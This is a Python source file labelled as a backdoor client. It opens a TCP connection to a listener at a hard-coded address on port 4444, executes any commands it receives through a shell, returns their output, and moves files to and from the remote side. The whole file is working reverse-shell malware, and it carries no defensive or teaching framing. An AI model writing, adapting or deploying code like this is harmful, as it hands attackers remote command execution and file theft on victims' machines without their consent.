import socket
import subprocess
import json
import os
import argparse

# This is the Backdoor (Client) that connects to Listener (Server)
# python3 Client.py


class Client:
    def __init__(self, server_ip="10.1.1.5", port=4444):
        self.server_ip = server_ip
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        """Connect to the server and handle communication."""
        try:
            self.client_socket.connect((self.server_ip, self.port))
            print(f"[+] Connected to server at {self.server_ip}:{self.port}")
            self.handle_commands()
        except ConnectionRefusedError:
            print("[!] Unable to connect to server. Ensure the server is running.")
        except Exception as e:
            print(f"[!] Unexpected error: {str(e)}")
        finally:
            self.cleanup()

    def send_data(self, data):
        """Serialize and send data as JSON."""
        try:
            serialized_data = json.dumps(data)
            self.client_socket.sendall(serialized_data.encode())
        except Exception as e:
            print(f"[!] Error sending data: {str(e)}")

    def receive_data(self):
        """Receive and deserialize JSON data."""
        try:
            raw_data = self.client_socket.recv(4096).decode()
            return json.loads(raw_data)
        except json.JSONDecodeError:
            print("[!] Received corrupted data.")
            return {}
        except Exception as e:
            print(f"[!] Error receiving data: {str(e)}")
            return {}

    def execute_command(self, command):
        """Execute a system command or handle special cases like 'cd'."""
        if command.startswith("cd "):
            return self.change_directory(command)
        return self.run_shell_command(command)

    def change_directory(self, command):
        """Change the current working directory."""
        try:
            path = command.split(" ", 1)[1]
            os.chdir(path)
            return f"Changed directory to {os.getcwd()}"
        except FileNotFoundError:
            return "[!] Directory not found."
        except IndexError:
            return "[!] No directory specified."
        except Exception as e:
            return f"[!] Error changing directory: {str(e)}"

    def run_shell_command(self, command):
        """Run a shell command and return its output."""
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return f"[!] Command failed: {e.output.decode()}"
        except Exception as e:
            return f"[!] Error executing command: {str(e)}"

    def upload_file(self):
        """Upload a file to the server."""
        filename = input("[?] Enter file to send: ").strip()
        if not os.path.exists(filename):
            print("[!] File not found.")
            return

        try:
            with open(filename, "rb") as f:
                file_data = f.read()
            self.send_data({"command": "upload", "filename": os.path.basename(filename), "data": file_data.hex()})
            print(f"[+] Uploaded {filename} to server.")
        except Exception as e:
            print(f"[!] Error uploading file: {str(e)}")

    def download_file(self, data):
        """Receive a file from the server."""
        filename = data.get("filename")
        file_data = data.get("data", "")

        if not filename or not file_data:
            print("[!] Invalid file data received.")
            return

        try:
            with open(filename, "wb") as f:
                f.write(bytes.fromhex(file_data))
            print(f"[+] Successfully downloaded {filename}")
        except Exception as e:
            print(f"[!] Error saving file: {str(e)}")

    def handle_commands(self):
        """Main loop to receive and execute commands."""
        try:
            while True:
                data = self.receive_data()
                command = data.get("command", "")

                if command.lower() == "exit":
                    print("[+] Server requested disconnection. Exiting.")
                    break
                elif command == "upload":
                    self.upload_file()
                elif command == "download":
                    self.download_file(data)
                else:
                    output = self.execute_command(command)
                    self.send_data({"output": output})

        except (ConnectionResetError, BrokenPipeError):
            print("[!] Server disconnected.")
        except KeyboardInterrupt:
            print("\n[!] User interrupted. Exiting.")
        finally:
            self.cleanup()

    def cleanup(self):
        """Close the socket properly."""
        try:
            self.client_socket.close()
            print("[+] Client disconnected.")
        except Exception as e:
            print(f"[!] Error during cleanup: {str(e)}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Client for remote command execution.")
    parser.add_argument("-s", "--serverIP", type=str, default="10.1.1.5", help="Server IP address (default: 10.1.1.5)")

    args = parser.parse_args()
    client = Client(server_ip=args.serverIP)
    client.connect()
